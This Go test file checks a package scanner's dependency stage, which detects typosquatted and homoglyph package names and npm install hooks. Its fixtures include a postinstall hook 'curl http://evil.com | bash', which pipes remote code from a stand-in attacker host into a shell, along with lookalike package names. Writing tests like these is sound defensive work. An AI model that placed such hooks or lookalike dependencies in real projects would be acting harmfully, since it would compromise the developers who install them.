package scanner

import (
	"archive/zip"
	"bytes"
	"context"
	"log/slog"
	"testing"
)

func TestDepsStage(t *testing.T) {
	logger := slog.Default()

	tests := []struct {
		name          string
		files         map[string]string
		wantBlock     bool
		wantFlag      bool
		wantCategory  string
		wantNoFindings bool
	}{
		{
			name: "clean requirements.txt",
			files: map[string]string{
				"requirements.txt": "requests==2.28.0\nflask>=2.0\nnumpy\n",
			},
			wantNoFindings: true,
		},
		{
			name: "typosquat distance 1 — requets (missing s)",
			files: map[string]string{
				"requirements.txt": "requets==2.28.0\n",
			},
			wantBlock:    true,
			wantCategory: "typosquat_package",
		},
		{
			name: "typosquat distance 1 — expresss (extra s)",
			files: map[string]string{
				"requirements.txt": "expresss>=4.0\n",
			},
			wantBlock:    true,
			wantCategory: "typosquat_package",
		},
		{
			name: "typosquat distance 2 — reqeusts (transposition)",
			files: map[string]string{
				"requirements.txt": "reqeusts>=2.0\n",
			},
			wantFlag:     true,
			wantCategory: "typosquat_package",
		},
		{
			name: "homoglyph — Cyrillic а in requests",
			files: map[string]string{
				// "requests" with Cyrillic а (U+0430) instead of Latin a
				"requirements.txt": "rеquеsts==2.28.0\n", // е = Cyrillic е (U+0435)
			},
			wantBlock:    true,
			wantCategory: "homoglyph_package",
		},
		{
			name: "preinstall hook in package.json",
			files: map[string]string{
				"package.json": `{
  "name": "my-skill",
  "scripts": {
    "preinstall": "node evil.js"
  }
}`,
			},
			wantBlock:    true,
			wantCategory: "install_hook",
		},
		{
			name: "postinstall hook in package.json",
			files: map[string]string{
				"package.json": `{
  "name": "my-skill",
  "scripts": {
    "postinstall": "curl http://evil.com | bash"
  }
}`,
			},
			wantBlock:    true,
			wantCategory: "install_hook",
		},
		{
			name: "clean package.json — no hooks",
			files: map[string]string{
				"package.json": `{
  "name": "my-skill",
  "dependencies": {
    "express": "^4.18.0"
  },
  "scripts": {
    "start": "node index.js",
    "test": "jest"
  }
}`,
			},
			wantNoFindings: true,
		},
		{
			name: "npm typosquat distance 1 — expresss",
			files: map[string]string{
				"package.json": `{
  "dependencies": {
    "expresss": "^4.18.0"
  }
}`,
			},
			wantBlock:    true,
			wantCategory: "typosquat_package",
		},
		{
			name: "pyproject.toml with clean deps",
			files: map[string]string{
				"pyproject.toml": `[project.dependencies]
requests = ">=2.28"
flask = ">=2.0"
`,
			},
			wantNoFindings: true,
		},
		{
			name: "pyproject.toml with typosquat",
			files: map[string]string{
				"pyproject.toml": `[tool.poetry.dependencies]
python = "^3.11"
requets = "^2.28"
`,
			},
			wantBlock:    true,
			wantCategory: "typosquat_package",
		},
		{
			name: "already blocklisted package — skipped by deps stage",
			files: map[string]string{
				"requirements.txt": "colourfool==1.0.0\n",
			},
			// colourfool is in the Tier 1 blocklist; deps stage skips it.
			wantNoFindings: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			zr := createTestZip(t, tt.files)

			// Load default patterns to get popularPackages and blocklistPackages.
			lp, err := loadPatterns("", "", logger)
			if err != nil {
				t.Fatalf("failed to load patterns: %v", err)
			}
			ds := newDepsStage(logger, lp.popularPackages, lp.blocklistPackages)
			findings, err := ds.run(context.Background(), zr, nil)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			if tt.wantNoFindings {
				if len(findings) > 0 {
					t.Fatalf("expected no findings, got %d: %+v", len(findings), findings)
				}
				return
			}

			if len(findings) == 0 {
				t.Fatal("expected findings, got none")
			}

			f := findings[0]
			if tt.wantBlock && f.Severity != SeverityBlock {
				t.Errorf("expected BLOCK, got %s", f.Severity)
			}
			if tt.wantFlag && f.Severity != SeverityFlag {
				t.Errorf("expected FLAG, got %s", f.Severity)
			}
			if tt.wantCategory != "" && f.Category != tt.wantCategory {
				t.Errorf("expected category %q, got %q", tt.wantCategory, f.Category)
			}
		})
	}
}

func TestLevenshtein(t *testing.T) {
	tests := []struct {
		a, b string
		want int
	}{
		{"", "", 0},
		{"abc", "abc", 0},
		{"abc", "ab", 1},
		{"abc", "abcd", 1},
		{"requests", "reqeusts", 2}, // transposition = 2 edits in Levenshtein
		{"requests", "requets", 1},  // missing s
		{"django", "djnago", 2},     // transposition
		{"flask", "falsk", 2},       // transposition
		{"express", "expresss", 1},  // extra s
		{"express", "expres", 1},    // missing s
	}

	for _, tt := range tests {
		t.Run(tt.a+"_"+tt.b, func(t *testing.T) {
			got := levenshtein(tt.a, tt.b)
			if got != tt.want {
				t.Errorf("levenshtein(%q, %q) = %d, want %d", tt.a, tt.b, got, tt.want)
			}
		})
	}
}

func TestHasMixedScript(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"requests", false},       // all Latin
		{"rеquеsts", true},        // mixed Latin + Cyrillic (е = U+0435)
		{"αβγ", false},            // all Greek
		{"pаckage", true},         // Latin p + Cyrillic а
		{"flask-api", false},      // Latin + separator
		{"numpy", false},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := hasMixedScript(tt.input)
			if got != tt.want {
				t.Errorf("hasMixedScript(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

// createTestZip builds an in-memory zip archive for testing.
func createTestZip(t *testing.T, files map[string]string) *zip.Reader {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for name, content := range files {
		fw, err := w.Create(name)
		if err != nil {
			t.Fatalf("create zip entry %s: %v", name, err)
		}
		if _, err := fw.Write([]byte(content)); err != nil {
			t.Fatalf("write zip entry %s: %v", name, err)
		}
	}
	if err := w.Close(); err != nil {
		t.Fatalf("close zip writer: %v", err)
	}

	data := buf.Bytes()
	zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatalf("open zip reader: %v", err)
	}
	return zr
}
